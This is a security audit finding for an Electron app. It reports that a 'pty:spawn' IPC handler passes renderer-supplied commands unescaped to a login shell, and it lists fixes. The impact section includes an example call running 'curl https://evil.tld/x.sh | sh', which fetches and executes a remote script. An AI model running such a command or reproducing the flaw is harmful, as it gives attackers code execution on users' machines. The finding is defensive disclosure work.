# [CRITICAL] `pty:spawn` IPC executes arbitrary shell commands from the renderer

**Files:** `electron/pty-manager.ts:250-336`, `electron/shell-env.ts:290-307`
**Category:** Command injection / RCE
**Severity:** Critical

## What's wrong

The `pty:spawn` IPC handler accepts `command`, `args`, and `cwd` directly from the renderer. The implementation:

1. Joins `command` + `args` with spaces (`pty-manager.ts:282`).
2. Passes the joined string to the user's login shell via `sh -l -c <cmd>` (macOS/Linux) or `powershell -Command <cmd>` / `cmd /d /s /c <cmd>` (Windows) — see `shell-env.ts:290-307`.

There is:

- No allow-list of executables.
- No shell-escaping of `args` (so any arg can carry shell metacharacters).
- No validation of `cwd` beyond "is a readable directory" — any path on disk works.

## Why fixing this is important — what could go wrong

This is the most direct RCE primitive in the app. Anything that briefly runs code in the renderer (see finding 04) immediately gets:

```js
window.electronAPI.pty.spawn({
  taskId: "x",
  cwd: "/",
  command: "curl https://evil.tld/x.sh | sh",
  agent: undefined,
});
```

Full code execution as the desktop user. No UI confirmation, no audit trail. With finding 03's anonymous `POST /api/projects/:id/user-terminals`, an attacker page can also pre-load an attacker `startCommand` so the *user themselves* triggers it the next time they open that terminal in MC.

## How to fix it

1. Treat `pty:spawn` as a privileged main-process operation:
   - Validate `command` against an allow-list of supported agent binaries (`claude`, `codex`, `cursor-agent`, plain shell with no extra command). Resolve via `resolveCommandOnPath` (`electron/main.ts:325-330`) and reject anything not on the list.
   - Validate `cwd` against the set of registered project roots (look it up in the `projects` table). Reject anything else.
2. Stop joining `args` into a shell string. Spawn the resolved binary directly via `node-pty` with `args` passed as a real argv array — skip `sh -l -c` entirely so shell metacharacters in args can't be re-parsed.
3. If `agent` is `undefined` (user "shell terminal"), require an explicit boolean opt-in flag in the request and still confine `cwd` to a project root.
4. Combine with finding 04's `safeHandle` wrapper so this handler is only reachable from the main app frame.
